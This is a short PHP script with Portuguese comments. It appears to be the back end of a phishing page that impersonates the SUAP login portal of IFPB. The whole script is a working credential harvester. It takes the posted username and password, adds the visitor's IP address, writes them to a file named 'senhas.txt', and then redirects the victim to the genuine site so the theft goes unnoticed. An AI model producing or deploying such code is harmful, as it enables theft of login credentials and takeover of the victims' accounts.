<?php
$usr = $_POST['id_username']; // ID do formulário de login
$pswd = $_POST['id_password']; // ID do formulário de senha
$ip = $_SERVER['REMOTE_ADDR'];
$all = "Email: ".$usr." - Senha: ".$pswd." - IP: ".$ip."<br>";
$redirect = "https://suap.ifpb.edu.br";
$fp = fopen("senhas.txt", "a");
fwrite($fp, $all);
fclose($fp);
header("location: $redirect"); // Redirecionamento
?>